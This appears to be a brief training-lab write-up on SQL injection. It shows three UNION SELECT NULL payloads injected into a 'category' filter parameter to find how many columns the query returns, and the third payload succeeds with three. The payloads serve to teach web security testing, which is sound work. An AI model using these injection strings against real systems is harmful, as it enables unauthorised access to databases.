# Determining the number of columns returned by the query

`/filter?category=Gifts'+UNION+SELECT+NULL`: Internal Server Error

`/filter?category=Gifts'+UNION+SELECT+NULL,+NULL`: Internal Server Error

`/filter?category=Gifts'+UNION+SELECT+NULL,+NULL,+NULL--` Ok (3 columns)

Solved.

